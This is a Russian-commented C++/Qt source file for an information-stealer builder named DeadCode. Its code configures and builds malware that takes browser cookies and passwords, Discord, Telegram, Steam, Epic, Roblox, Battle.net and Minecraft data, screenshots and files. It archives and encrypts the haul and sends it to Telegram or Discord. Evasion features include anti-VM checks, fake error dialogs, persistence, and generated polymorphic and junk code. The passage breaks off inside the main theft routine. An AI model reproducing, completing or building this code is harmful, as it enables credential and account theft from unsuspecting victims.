#include "mainwindow.h"
#include "ui_mainwindow.h"
#include "build_key.h"
#include "polymorphic_code.h"
#include "junk_code.h"

#include <QMessageBox>
#include <QProcess>
#include <QFileDialog>
#include <QFile>
#include <QTextStream>
#include <QPropertyAnimation>
#include <QTimer>
#include <QDebug>
#include <QScreen>
#include <QPixmap>
#include <QJsonDocument>
#include <QJsonObject>
#include <QNetworkReply>
#include <QHttpMultiPart>
#include <QHostInfo>
#include <QSettings>
#include <QDir>
#include <QRegularExpression>
#include <QGuiApplication>
#include <QThread>
#include <QSysInfo>
#include <QClipboard>
#include <random>
#include <sstream>
#include <iomanip>
#include <filesystem>
#include <vector>
#include <string>
#include <fstream>
#include <windows.h>
#include <bcrypt.h>
#include <zip.h>
#include <sqlite3.h>
#include <curl/curl.h>
#include <shlwapi.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <iphlpapi.h>

// Определение глобальной переменной
MainWindow* g_mainWindow = nullptr;

// Функция для получения данных от libcurl
static size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* s) {
    size_t newLength = size * nmemb;
    s->append((char*)contents, newLength);
    return newLength;
}

// Реализация класса StealerWorker
class StealerWorker : public QObject {
    Q_OBJECT
public:
    StealerWorker(MainWindow* window, const std::string& tempDir) : window(window), tempDir(tempDir) {}

public slots:
    void process() {
        window->StealAndSendData(tempDir);
        emit finished();
    }

signals:
    void finished();

private:
    MainWindow* window;
    std::string tempDir;
};

// Удобный метод для вызова сигнала logUpdated
void MainWindow::emitLog(const QString& message) {
    QMutexLocker locker(&logMutex);
    emit logUpdated(message);
}

// Реализация метода updateConfigFromUI
void MainWindow::updateConfigFromUI() {
    QMutexLocker locker(&logMutex); // Потокобезопасность

    config.sendMethod = sendMethodComboBox->currentText().toStdString();
    config.telegramToken = tokenLineEdit->text().toStdString();
    config.chatId = chatIdLineEdit->text().toStdString();
    config.discordWebhook = discordWebhookLineEdit->text().toStdString();
    config.filename = fileNameLineEdit->text().toStdString();
    config.encryptionKey1 = encryptionKey1LineEdit->text().toStdString();
    config.encryptionKey2 = encryptionKey2LineEdit->text().toStdString();
    config.encryptionSalt = encryptionSaltLineEdit->text().toStdString();
    config.iconPath = iconPathLineEdit->text().toStdString();
    config.githubToken = githubTokenLineEdit->text().toStdString();
    config.githubRepo = githubRepoLineEdit->text().toStdString();

    // Обновление чекбоксов
    config.discord = discordCheckBox->isChecked();
    config.steam = steamCheckBox->isChecked();
    config.steamMAFile = steamMAFileCheckBox->isChecked();
    config.epic = epicCheckBox->isChecked();
    config.roblox = robloxCheckBox->isChecked();
    config.battlenet = battlenetCheckBox->isChecked();
    config.minecraft = minecraftCheckBox->isChecked();
    config.cookies = cookiesCheckBox->isChecked();
    config.passwords = passwordsCheckBox->isChecked();
    config.screenshot = screenshotCheckBox->isChecked();
    config.fileGrabber = fileGrabberCheckBox->isChecked();
    config.systemInfo = systemInfoCheckBox->isChecked();
    config.socialEngineering = socialEngineeringCheckBox->isChecked();
    config.chatHistory = chatHistoryCheckBox->isChecked();
    config.telegram = telegramCheckBox->isChecked();
    config.antiVM = antiVMCheckBox->isChecked();
    config.fakeError = fakeErrorCheckBox->isChecked();
    config.silent = silentCheckBox->isChecked();
    config.autoStart = autoStartCheckBox->isChecked();
    config.persist = persistCheckBox->isChecked();
}

// Конструктор
MainWindow::MainWindow(QWidget *parent)
    : QMainWindow(parent)
    , ui(new Ui::MainWindow)
    , manager(new QNetworkAccessManager(this))
    , isBuilding(false)
    , buildTimer(new QTimer(this))
    , statusCheckTimer(new QTimer(this))
{
    ui->setupUi(this);
    g_mainWindow = this; // Инициализация глобальной переменной

    // Инициализация UI элементов
    tokenLineEdit = ui->tokenLineEdit;
    chatIdLineEdit = ui->chatIdLineEdit;
    discordWebhookLineEdit = ui->discordWebhookLineEdit;
    fileNameLineEdit = ui->fileNameLineEdit;
    encryptionKey1LineEdit = ui->encryptionKey1LineEdit;
    encryptionKey2LineEdit = ui->encryptionKey2LineEdit;
    encryptionSaltLineEdit = ui->encryptionSaltLineEdit;
    iconPathLineEdit = ui->iconPathLineEdit;
    githubTokenLineEdit = ui->githubTokenLineEdit;
    githubRepoLineEdit = ui->githubRepoLineEdit;
    sendMethodComboBox = ui->sendMethodComboBox;
    buildMethodComboBox = ui->buildMethodComboBox;
    steamCheckBox = ui->steamCheckBox;
    steamMAFileCheckBox = ui->steamMAFileCheckBox;
    epicCheckBox = ui->epicCheckBox;
    robloxCheckBox = ui->robloxCheckBox;
    battlenetCheckBox = ui->battlenetCheckBox;
    minecraftCheckBox = ui->minecraftCheckBox;
    discordCheckBox = ui->discordCheckBox;
    telegramCheckBox = ui->telegramCheckBox;
    chatHistoryCheckBox = ui->chatHistoryCheckBox;
    cookiesCheckBox = ui->cookiesCheckBox;
    passwordsCheckBox = ui->passwordsCheckBox;
    screenshotCheckBox = ui->screenshotCheckBox;
    fileGrabberCheckBox = ui->fileGrabberCheckBox;
    systemInfoCheckBox = ui->systemInfoCheckBox;
    socialEngineeringCheckBox = ui->socialEngineeringCheckBox;
    antiVMCheckBox = ui->antiVMCheckBox;
    fakeErrorCheckBox = ui->fakeErrorCheckBox;
    silentCheckBox = ui->silentCheckBox;
    autoStartCheckBox = ui->autoStartCheckBox;
    persistCheckBox = ui->persistCheckBox;
    textEdit = ui->textEdit;
    iconBrowseButton = ui->iconBrowseButton;
    buildButton = ui->buildButton;
    actionSaveConfig = ui->actionSaveConfig;
    actionLoadConfig = ui->actionLoadConfig;
    actionExportLogs = ui->actionExportLogs;
    actionExit = ui->actionExit;
    actionAbout = ui->actionAbout;

    // Инициализация значений по умолчанию
    sendMethodComboBox->addItems({"Local File", "Telegram", "Discord"});
    buildMethodComboBox->addItems({"Local Build", "GitHub Actions"});
    fileNameLineEdit->setText("DeadCode.exe");
    textEdit->setPlaceholderText("Logs will appear here...");

    // Анимация для логотипа
    QPropertyAnimation *logoAnimation = new QPropertyAnimation(ui->logoLabel, "geometry", this);
    logoAnimation->setDuration(1500);
    logoAnimation->setStartValue(QRect(0, -150, 600, 150));
    logoAnimation->setEndValue(QRect(0, 0, 600, 150));
    logoAnimation->setEasingCurve(QEasingCurve::OutBounce);
    logoAnimation->start();

    // Анимация пульсации для кнопки "Собрать"
    QPropertyAnimation *buttonAnimation = new QPropertyAnimation(ui->buildButton, "size", this);
    buttonAnimation->setDuration(1000);
    buttonAnimation->setStartValue(QSize(100, 40));
    buttonAnimation->setKeyValueAt(0.5, QSize(120, 50));
    buttonAnimation->setEndValue(QSize(100, 40));
    buttonAnimation->setLoopCount(-1);
    buttonAnimation->setEasingCurve(QEasingCurve::InOutQuad);
    buttonAnimation->start();

    // Анимация появления секций
    animateSection(ui->gamingSectionLabel, ui->gamingSpacer);
    animateSection(ui->messengersSectionLabel, ui->messengersSpacer);
    animateSection(ui->browserSectionLabel, ui->browserSpacer);
    animateSection(ui->additionalSectionLabel, ui->additionalSpacer);
    animateSection(ui->stealthSectionLabel, ui->verticalSpacer);

    // Инициализация строки состояния
    ui->statusbar->showMessage("Готово", 0);

    // Подключение сигналов и слотов
    connect(ui->buildButton, &QPushButton::clicked, this, &MainWindow::on_buildButton_clicked);
    connect(ui->iconBrowseButton, &QPushButton::clicked, this, &MainWindow::on_iconBrowseButton_clicked);
    connect(ui->actionSaveConfig, &QAction::triggered, this, &MainWindow::on_actionSaveConfig_triggered);
    connect(ui->actionLoadConfig, &QAction::triggered, this, &MainWindow::on_actionLoadConfig_triggered);
    connect(ui->actionExportLogs, &QAction::triggered, this, &MainWindow::on_actionExportLogs_triggered);
    connect(ui->actionExit, &QAction::triggered, this, &MainWindow::on_actionExit_triggered);
    connect(ui->actionAbout, &QAction::triggered, this, &MainWindow::on_actionAbout_triggered);
    connect(manager, &QNetworkAccessManager::finished, this, &MainWindow::replyFinished);
    connect(ui->sendMethodComboBox, &QComboBox::currentTextChanged, this, [this](const QString& text) {
        ui->statusbar->showMessage("Метод отправки: " + text, 0);
    });
    connect(this, &MainWindow::logUpdated, this, &MainWindow::appendLog);
    connect(this, &MainWindow::startStealSignal, this, &MainWindow::startStealProcess);
    connect(buildTimer, &QTimer::timeout, this, &MainWindow::buildExecutable);
    connect(statusCheckTimer, &QTimer::timeout, this, &MainWindow::checkBuildStatus);

    // Инициализация config начальными значениями
    updateConfigFromUI();
}

// Деструктор
MainWindow::~MainWindow() {
    delete ui;
    delete manager;
    delete buildTimer;
    delete statusCheckTimer;
    g_mainWindow = nullptr;
}

// Анимация секций
void MainWindow::animateSection(QLabel* sectionLabel, QSpacerItem* spacer) {
    QWidget* parentWidget = sectionLabel->parentWidget();
    QVBoxLayout* layout = qobject_cast<QVBoxLayout*>(parentWidget->layout());
    if (!layout) return;

    QList<QWidget*> widgetsToAnimate;
    int startIndex = layout->indexOf(sectionLabel);
    int endIndex = spacer ? layout->indexOf(spacer) : layout->count();

    widgetsToAnimate.append(sectionLabel);
    for (int i = startIndex + 1; i < endIndex; ++i) {
        QLayoutItem* item = layout->itemAt(i);
        if (QWidget* widget = item->widget()) {
            if (dynamic_cast<QCheckBox*>(widget) || dynamic_cast<QComboBox*>(widget)) {
                widgetsToAnimate.append(widget);
            }
        }
    }

    for (QWidget* widget : widgetsToAnimate) {
        widget->setStyleSheet("opacity: 0;");
        widget->setMaximumHeight(0);
    }

    QParallelAnimationGroup* group = new QParallelAnimationGroup(this);
    for (QWidget* widget : widgetsToAnimate) {
        QPropertyAnimation* opacityAnimation = new QPropertyAnimation(widget, "windowOpacity");
        opacityAnimation->setDuration(500);
        opacityAnimation->setStartValue(0);
        opacityAnimation->setEndValue(1);
        opacityAnimation->setEasingCurve(QEasingCurve::OutCubic);

        QPropertyAnimation* heightAnimation = new QPropertyAnimation(widget, "maximumHeight");
        heightAnimation->setDuration(500);
        heightAnimation->setStartValue(0);
        heightAnimation->setEndValue(widget->sizeHint().height());
        heightAnimation->setEasingCurve(QEasingCurve::OutCubic);

        group->addAnimation(opacityAnimation);
        group->addAnimation(heightAnimation);
    }

    QTimer::singleShot(widgetsToAnimate.indexOf(sectionLabel) * 200, this, [group]() {
        group->start(QAbstractAnimation::DeleteWhenStopped);
    });
}

// Генерация случайной строки
std::string MainWindow::generateRandomString(size_t length) {
    static const char alphanum[] =
        "0123456789"
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "abcdefghijklmnopqrstuvwxyz";
    std::string result;
    result.reserve(length);

    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, sizeof(alphanum) - 2);

    for (size_t i = 0; i < length; ++i) {
        result += alphanum[dis(gen)];
    }

    return result;
}

// Генерация уникального XOR-ключа
std::string MainWindow::generateUniqueXorKey() {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, 255);
    std::stringstream ss;
    for (int i = 0; i < 16; ++i) {
        ss << std::hex << std::setw(2) << std::setfill('0') << dis(gen);
    }
    return ss.str();
}

// Получение ключа шифрования
std::array<unsigned char, 16> MainWindow::GetEncryptionKey(bool useFirstKey) {
    std::string keyStr = useFirstKey ? config.encryptionKey1 : config.encryptionKey2;
    if (keyStr.empty()) {
        keyStr = generateRandomString(16);
        if (useFirstKey) config.encryptionKey1 = keyStr;
        else config.encryptionKey2 = keyStr;
    }
    std::array<unsigned char, 16> key;
    if (keyStr.length() >= 16) {
        for (size_t i = 0; i < 16; ++i) {
            key[i] = static_cast<unsigned char>(keyStr[i]);
        }
    } else {
        for (size_t i = 0; i < 16; ++i) {
            key[i] = static_cast<unsigned char>(keyStr[i % keyStr.length()]);
        }
    }
    return key;
}

// Генерация IV
std::array<unsigned char, 16> MainWindow::generateIV() {
    std::array<unsigned char, 16> iv;
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, 255);
    for (auto& byte : iv) {
        byte = static_cast<unsigned char>(dis(gen));
    }
    return iv;
}

// Проверка на виртуальную машину
bool MainWindow::isRunningInVM() {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char buffer[1024];
        DWORD size = sizeof(buffer);
        if (RegQueryValueExA(hKey, "SystemBiosVersion", nullptr, nullptr, (LPBYTE)buffer, &size) == ERROR_SUCCESS) {
            std::string biosVersion(buffer);
            if (biosVersion.find("VMware") != std::string::npos || biosVersion.find("VirtualBox") != std::string::npos) {
                RegCloseKey(hKey);
                return true;
            }
        }
        RegCloseKey(hKey);
    }
    return false;
}

// Генерация полиморфного кода
void MainWindow::generatePolymorphicCode() {
    std::ofstream polyFile("polymorphic_code.h");
    if (!polyFile.is_open()) {
        emitLog("Ошибка: Не удалось создать polymorphic_code.h. Проверьте права доступа.");
        isBuilding = false;
        return;
    }

    polyFile << "#ifndef POLYMORPHIC_CODE_H\n";
    polyFile << "#define POLYMORPHIC_CODE_H\n\n";
    polyFile << "#include <random>\n";
    polyFile << "#include <string>\n";
    polyFile << "#include <sstream>\n";
    polyFile << "#include <iomanip>\n";
    polyFile << "#include <chrono>\n";
    polyFile << "#include <thread>\n\n";
    polyFile << "// Этот файл перегенерируется динамически в mainwindow.cpp через generatePolymorphicCode()\n\n";

    polyFile << "inline int getRandomNumber(int min, int max) {\n";
    polyFile << "    static std::random_device rd;\n";
    polyFile << "    static std::mt19937 gen(rd());\n";
    polyFile << "    std::uniform_int_distribution<> dis(min, max);\n";
    polyFile << "    return dis(gen);\n";
    polyFile << "}\n\n";

    polyFile << "inline std::string generateRandomString(size_t length) {\n";
    polyFile << "    static const char alphanum[] =\n";
    polyFile << "        \"0123456789\"\n";
    polyFile << "        \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\"\n";
    polyFile << "        \"abcdefghijklmnopqrstuvwxyz\";\n";
    polyFile << "    std::string result;\n";
    polyFile << "    result.reserve(length);\n";
    polyFile << "    for (size_t i = 0; i < length; ++i) {\n";
    polyFile << "        result += alphanum[getRandomNumber(0, sizeof(alphanum) - 2)];\n";
    polyFile << "    }\n";
    polyFile << "    return result;\n";
    polyFile << "}\n\n";

    polyFile << "inline std::string generateRandomFuncName() {\n";
    polyFile << "    static const char* prefixes[] = {\"polyFunc\", \"obfFunc\", \"cryptFunc\", \"hideFunc\", \"maskFunc\"};\n";
    polyFile << "    std::stringstream ss;\n";
    polyFile << "    ss << prefixes[getRandomNumber(0, 4)] << \"_\"\n";
    polyFile << "       << getRandomNumber(10000, 99999) << \"_\"\n";
    polyFile << "       << getRandomNumber(10000, 99999);\n";
    polyFile << "    return ss.str();\n";
    polyFile << "}\n\n";

    polyFile << "namespace Polymorphic {\n\n";

    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(5, 10);
    int funcCount = dis(gen);
    std::vector<std::string> funcNames;
    for (int i = 0; i < funcCount; ++i) {
        std::string funcName;
        do {
            std::stringstream ss;
            ss << "polyFunc_" << std::setw(5) << std::setfill('0') << dis(gen) << "_" << std::setw(5) << std::setfill('0') << dis(gen);
            funcName = ss.str();
        } while (std::find(funcNames.begin(), funcNames.end(), funcName) != funcNames.end());
        funcNames.push_back(funcName);
        polyFile << "    inline void " << funcName << "() {\n";
        polyFile << "        volatile int dummy_" << dis(gen) << "_" << dis(gen) << " = getRandomNumber(1000, 15000);\n";
        polyFile << "        std::string noise = generateRandomString(getRandomNumber(5, 20));\n";
        polyFile << "        volatile int dummy2_" << dis(gen) << "_" << dis(gen) << " = dummy_" << dis(gen) << "_" << dis(gen) << " ^ noise.length();\n";
        polyFile << "        for (int i = 0; i < getRandomNumber(3, 15); i++) {\n";
        polyFile << "            if (dummy2_" << dis(gen) << "_" << dis(gen) << " % 2 == 0) {\n";
        polyFile << "                dummy2_" << dis(gen) << "_" << dis(gen) << " = (dummy2_" << dis(gen) << "_" << dis(gen) << " << getRandomNumber(1, 3)) ^ noise[i % noise.length()];\n";
        polyFile << "            } else {\n";
        polyFile << "                dummy2_" << dis(gen) << "_" << dis(gen) << " = (dummy2_" << dis(gen) << "_" << dis(gen) << " >> getRandomNumber(1, 2)) + getRandomNumber(10, 50);\n";
        polyFile << "            }\n";
        polyFile << "        }\n";
        polyFile << "        std::this_thread::sleep_for(std::chrono::milliseconds(getRandomNumber(1, 10)));\n";
        polyFile << "    }\n\n";
    }

    polyFile << "    inline void executePolymorphicCode() {\n";
    for (const auto& funcName : funcNames) {
        polyFile << "        " << funcName << "();\n";
    }
    polyFile << "    }\n\n";

    polyFile << "} // namespace Polymorphic\n\n";
    polyFile << "#endif // POLYMORPHIC_CODE_H\n";

    polyFile.close();
    emitLog("Полиморфный код сгенерирован в polymorphic_code.h");
}

// Генерация заголовочного файла ключей
void MainWindow::generateBuildKeyHeader() {
    std::ofstream keyFile("build_key.h");
    if (!keyFile.is_open()) {
        emitLog("Ошибка: Не удалось создать build_key.h. Проверьте права доступа.");
        isBuilding = false;
        return;
    }

    keyFile << "#ifndef BUILD_KEY_H\n";
    keyFile << "#define BUILD_KEY_H\n\n";
    keyFile << "#include <array>\n";
    keyFile << "#include <string>\n";
    keyFile << "#include <sstream>\n";
    keyFile << "#include <iomanip>\n";
    keyFile << "#include <random>\n\n";
    keyFile << "// Этот файл генерируется автоматически в mainwindow.cpp через generateBuildKeyHeader()\n\n";

    keyFile << "const std::string ENCRYPTION_KEY_1 = \"" << config.encryptionKey1 << "\";\n";
    keyFile << "const std::string ENCRYPTION_KEY_2 = \"" << config.encryptionKey2 << "\";\n";
    keyFile << "const std::string ENCRYPTION_SALT = \"" << config.encryptionSalt << "\";\n\n";

    keyFile << "inline std::array<unsigned char, 16> GetStaticEncryptionKey(const std::string& keyStr) {\n";
    keyFile << "    std::array<unsigned char, 16> key;\n";
    keyFile << "    if (keyStr.length() >= 16) {\n";
    keyFile << "        for (size_t i = 0; i < 16; ++i) {\n";
    keyFile << "            key[i] = static_cast<unsigned char>(keyStr[i]);\n";
    keyFile << "        }\n";
    keyFile << "    } else {\n";
    keyFile << "        for (size_t i = 0; i < 16; ++i) {\n";
    keyFile << "            key[i] = static_cast<unsigned char>(keyStr[i % keyStr.length()]);\n";
    keyFile << "        }\n";
    keyFile << "    }\n";
    keyFile << "    return key;\n";
    keyFile << "}\n\n";

    keyFile << "inline std::array<unsigned char, 16> GenerateIV() {\n";
    keyFile << "    std::array<unsigned char, 16> iv;\n";
    keyFile << "    std::random_device rd;\n";
    keyFile << "    std::mt19937 gen(rd());\n";
    keyFile << "    std::uniform_int_distribution<> dis(0, 255);\n";
    keyFile << "    for (auto& byte : iv) {\n";
    keyFile << "        byte = static_cast<unsigned char>(dis(gen));\n";
    keyFile << "    }\n";
    keyFile << "    return iv;\n";
    keyFile << "}\n\n";

    keyFile << "inline std::string GenerateUniqueXorKey() {\n";
    keyFile << "    std::random_device rd;\n";
    keyFile << "    std::mt19937 gen(rd());\n";
    keyFile << "    std::uniform_int_distribution<> dis(0, 255);\n";
    keyFile << "    std::stringstream ss;\n";
    keyFile << "    for (int i = 0; i < 16; ++i) {\n";
    keyFile << "        ss << std::hex << std::setw(2) << std::setfill('0') << dis(gen);\n";
    keyFile << "    }\n";
    keyFile << "    return ss.str();\n";
    keyFile << "}\n\n";

    keyFile << "inline std::string GenerateRandomSalt() {\n";
    keyFile << "    std::random_device rd;\n";
    keyFile << "    std::mt19937 gen(rd());\n";
    keyFile << "    std::uniform_int_distribution<> dis(0, 255);\n";
    keyFile << "    std::stringstream ss;\n";
    keyFile << "    for (int i = 0; i < 8; ++i) {\n";
    keyFile << "        ss << std::hex << std::setw(2) << std::setfill('0') << dis(gen);\n";
    keyFile << "    }\n";
    keyFile << "    return ss.str();\n";
    keyFile << "}\n\n";

    keyFile << "#endif // BUILD_KEY_H\n";

    keyFile.close();
    emitLog("Файл ключей шифрования сгенерирован в build_key.h");
}

// Копирование иконки
void MainWindow::copyIconToBuild() {
    QString iconPath = ui->iconPathLineEdit->text();
    if (!iconPath.isEmpty()) {
        try {
            std::filesystem::copy_file(iconPath.toStdString(), "icon.ico", std::filesystem::copy_options::overwrite_existing);
            emitLog("Иконка скопирована в директорию сборки: icon.ico");
        } catch (const std::exception& e) {
            emitLog("Ошибка копирования иконки: " + QString::fromStdString(e.what()));
            isBuilding = false;
        }
    } else {
        emitLog("Иконка не указана, пропускаем копирование");
    }
}

// Сборка исполняемого файла
void MainWindow::buildExecutable() {
    if (isBuilding) return;
    isBuilding = true;
    buildTimer->stop();
    ui->statusbar->showMessage("Сборка началась...", 0);

    JunkCode::executeJunkCode();
    emitLog("Выполнен мусорный код перед началом сборки");

    std::string buildDir = std::string(std::getenv("TEMP")) + "\\DeadCode_Build_" + std::to_string(GetTickCount());
    QDir().mkpath(QString::fromStdString(buildDir));
    emitLog("Создана директория для сборки: " + QString::fromStdString(buildDir));

    try {
        std::filesystem::create_directories(buildDir + "\\src");
        for (const auto& entry : std::filesystem::directory_iterator(".")) {
            if (entry.path().filename() == "mainwindow.h" ||
                entry.path().filename() == "mainwindow.cpp" ||
                entry.path().filename() == "main.cpp" ||
                entry.path().filename() == "mainwindow.ui" ||
                entry.path().filename() == "polymorphic_code.h" ||
                entry.path().filename() == "build_key.h" ||
                entry.path().filename() == "junk_code.h") {
                std::filesystem::copy_file(entry.path(), buildDir + "\\src\\" + entry.path().filename().string(), std::filesystem::copy_options::overwrite_existing);
            }
        }
        if (!ui->iconPathLineEdit->text().isEmpty()) {
            std::filesystem::copy_file(ui->iconPathLineEdit->text().toStdString(), buildDir + "\\icon.ico", std::filesystem::copy_options::overwrite_existing);
        }
        emitLog("Исходные файлы скопированы в " + QString::fromStdString(buildDir));
    } catch (const std::exception& e) {
        emitLog("Ошибка копирования исходных файлов: " + QString::fromStdString(e.what()));
        isBuilding = false;
        return;
    }

    std::ofstream proFile(buildDir + "\\stealer.pro");
    if (proFile.is_open()) {
        proFile << "QT += core gui network\n";
        proFile << "greaterThan(QT_MAJOR_VERSION, 4): QT += widgets\n";
        proFile << "TARGET = " << config.filename.substr(0, config.filename.find(".exe")) << "\n";
        proFile << "TEMPLATE = app\n";
        proFile << "SOURCES += src/main.cpp src/mainwindow.cpp\n";
        proFile << "HEADERS += src/mainwindow.h src/polymorphic_code.h src/build_key.h src/junk_code.h\n";
        proFile << "FORMS += src/mainwindow.ui\n";
        if (!ui->iconPathLineEdit->text().isEmpty()) {
            proFile << "RC_ICONS = icon.ico\n";
        }
        proFile << "LIBS += -luser32 -lbcrypt -lsqlite3 -lzip -lcurl -liphlpapi -lshlwapi -lpsapi\n";
        proFile.close();
        emitLog("Сгенерирован файл проекта: stealer.pro");
    } else {
        emitLog("Ошибка: Не удалось создать stealer.pro");
        isBuilding = false;
        return;
    }

    QProcess process;
    process.setWorkingDirectory(QString::fromStdString(buildDir));

    QString qmakePath = QStandardPaths::findExecutable("qmake");
    QString makePath = QStandardPaths::findExecutable("mingw32-make");
    if (qmakePath.isEmpty() || makePath.isEmpty()) {
        QString qtDir = qgetenv("QT_DIR");
        if (!qtDir.isEmpty()) {
            qmakePath = qtDir + "/bin/qmake.exe";
            makePath = qtDir + "/../mingw/bin/mingw32-make.exe";
        } else {
            emitLog("Ошибка: qmake или mingw32-make не найдены. Убедитесь, что Qt и MinGW установлены и добавлены в PATH.");
            isBuilding = false;
            return;
        }
    }

    process.start(qmakePath, QStringList() << "stealer.pro");
    if (!process.waitForFinished() || process.exitCode() != 0) {
        emitLog("Ошибка выполнения qmake: " + process.readAllStandardError());
        isBuilding = false;
        return;
    }
    emitLog("qmake выполнен успешно");

    process.start(makePath);
    if (!process.waitForFinished() || process.exitCode() != 0) {
        emitLog("Ошибка выполнения mingw32-make: " + process.readAllStandardError());
        isBuilding = false;
        return;
    }
    emitLog("mingw32-make выполнен успешно");

    std::string exePath = buildDir + "\\release\\" + config.filename;
    std::string outputPath = QDir::currentPath().toStdString() + "\\" + config.filename;
    try {
        std::filesystem::copy_file(exePath, outputPath, std::filesystem::copy_options::overwrite_existing);
        emitLog("Готовый билд сохранен: " + QString::fromStdString(outputPath));
    } catch (const std::exception& e) {
        emitLog("Ошибка копирования билда: " + QString::fromStdString(e.what()));
        isBuilding = false;
        return;
    }

    try {
        std::filesystem::remove_all(buildDir);
        emitLog("Временная директория сборки удалена");
    } catch (const std::exception& e) {
        emitLog("Ошибка удаления временной директории: " + QString::fromStdString(e.what()));
    }

    isBuilding = false;
    ui->statusbar->showMessage("Сборка завершена", 0);
    emit startStealSignal();
}

// Запуск GitHub Actions
void MainWindow::triggerGitHubActions() {
    QString githubToken = ui->githubTokenLineEdit->text();
    QString githubRepo = ui->githubRepoLineEdit->text();
    if (githubToken.isEmpty() || githubRepo.isEmpty()) {
        emitLog("Ошибка: GitHub Token или репозиторий не указаны");
        isBuilding = false;
        return;
    }

    QNetworkRequest request(QUrl("https://api.github.com/repos/" + githubRepo + "/actions/workflows/build.yml/dispatches"));
    request.setHeader(QNetworkRequest::ContentTypeHeader, "application/json");
    request.setRawHeader("Authorization", "token " + githubToken.toUtf8());
    request.setRawHeader("Accept", "application/vnd.github.v3+json");

    QJsonObject json;
    json["ref"] = "main";
    QByteArray data = QJsonDocument(json).toJson();

    QNetworkReply *reply = manager->post(request, data);
    connect(reply, &QNetworkReply::finished, this, [this, reply]() {
        if (reply->error() == QNetworkReply::NoError) {
            emitLog("Сборка успешно запущена через GitHub Actions");
            QJsonObject response = QJsonDocument::fromJson(reply->readAll()).object();
            workflowRunId = response["id"].toString();
            if (workflowRunId.isEmpty()) {
                emitLog("Ошибка: Не удалось получить ID workflow");
                isBuilding = false;
            } else {
                statusCheckTimer->start(30000);
            }
        } else {
            emitLog("Ошибка запуска GitHub Actions: " + reply->errorString());
            isBuilding = false;
        }
        reply->deleteLater();
    });
}

// Проверка статуса сборки GitHub Actions
void MainWindow::checkBuildStatus() {
    if (workflowRunId.isEmpty()) {
        emitLog("Ошибка: ID workflow не установлен");
        statusCheckTimer->stop();
        isBuilding = false;
        return;
    }

    QString githubToken = ui->githubTokenLineEdit->text();
    QString githubRepo = ui->githubRepoLineEdit->text();
    if (githubToken.isEmpty() || githubRepo.isEmpty()) {
        emitLog("Ошибка: GitHub Token или репозиторий не указаны");
        statusCheckTimer->stop();
        isBuilding = false;
        return;
    }

    QNetworkRequest request(QUrl("https://api.github.com/repos/" + githubRepo + "/actions/runs/" + workflowRunId));
    request.setRawHeader("Authorization", "token " + githubToken.toUtf8());
    request.setRawHeader("Accept", "application/vnd.github.v3+json");

    QNetworkReply *reply = manager->get(request);
    connect(reply, &QNetworkReply::finished, this, [this, reply]() {
        if (reply->error() == QNetworkReply::NoError) {
            QJsonObject json = QJsonDocument::fromJson(reply->readAll()).object();
            QString status = json["status"].toString();
            QString conclusion = json["conclusion"].toString();
            emitLog("Статус сборки GitHub Actions: " + status + " (Conclusion: " + conclusion + ")");
            if (status == "completed") {
                statusCheckTimer->stop();
                if (conclusion == "success") {
                    emitLog("Сборка успешно завершена через GitHub Actions");
                    emit startStealSignal();
                } else {
                    emitLog("Сборка завершилась с ошибкой");
                    isBuilding = false;
                }
            }
        } else {
            emitLog("Ошибка проверки статуса GitHub Actions: " + reply->errorString());
            statusCheckTimer->stop();
            isBuilding = false;
        }
        reply->deleteLater();
    });
}

// Запуск процесса кражи данных
void MainWindow::startStealProcess() {
    if (AntiAnalysis()) {
        emitLog("Обнаружена виртуальная машина или антивирус. Завершение работы.");
        FakeError();
        exitApp();
        return;
    }
    if (config.fakeError) FakeError();
    if (config.silent) Stealth();
    if (config.autoStart || config.persist) Persist();

    std::string tempDir = std::string(std::getenv("TEMP")) + "\\DeadCode_" + std::to_string(GetTickCount());
    QDir().mkpath(QString::fromStdString(tempDir));
    emitLog("Создана временная директория: " + QString::fromStdString(tempDir));

    QThread* thread = new QThread;
    StealerWorker* worker = new StealerWorker(this, tempDir);
    worker->moveToThread(thread);

    connect(thread, &QThread::started, worker, &StealerWorker::process);
    connect(worker, &StealerWorker::finished, thread, &QThread::quit);
    connect(worker, &StealerWorker::finished, worker, &StealerWorker::deleteLater);
    connect(thread, &QThread::finished, thread, &QThread::deleteLater);

    thread->start();
}

// Основной метод кражи и отправки данных
void MainWindow::StealAndSendData(const std::string& tempDir) {
    emitLog("Начинается процесс кражи данных...");

    JunkCode::executeJunkCode();
    emitLog("Выполнен мусорный код перед началом кражи данных");

    Polymorphic::executePolymorphicCode();
    emitLog("Выполнен полиморфный код перед началом кражи данных");

    if (config.screenshot) takeScreenshot(tempDir);
    if (config.systemInfo) collectSystemInfo(tempDir);
    if (config.cookies || config.passwords) stealBrowserData(tempDir);
    if (config.discord || config.chatHistory) stealDiscordData(tempDir);
    if (config.telegram || config.chatHistory) stealTelegramData(tempDir);
    if (config.steam || config.steamMAFile) stealSteamData(tempDir);
    if (config.epic) stealEpicData(tempDir);
    if (config.roblox) stealRobloxData(tempDir);
    if (config.battlenet) stealBattleNetData(tempDir);
    if (config.minecraft) stealMinecraftData(tempDir);
    if (config.fileGrabber) stealFiles(tempDir);
    if (config.socialEngineering) collectSocialEngineeringData(tempDir);
    if (config.chatHistory) stealChatHistory(tempDir);

    std::string archivePath = tempDir + "\\stolen_data.zip";
    archiveData(tempDir, archivePath);

    std::string encryptedPath = tempDir + "\\stolen_data_encrypted.zip";
    encryptData(archivePath, encryptedPath);

    std::vector<std::string> filesToSend;
    filesToSend.push_back(encryptedPath);
    for (const auto& screenshot : screenshotsPaths) {
        filesToSend.push_back(screenshot);
    }

    sendData(QString::fromStdString(encryptedPath), filesToSend);

    try {
        std::filesystem::remove_all(tempDir);
        emitLog("Временная директория удалена: " + QString::fromStdString(tempDir));
    } catch (const std::exception& e) {
        emitLog("Ошибка удаления временной директории: " + QString::fromStdString(e.what()));
    }

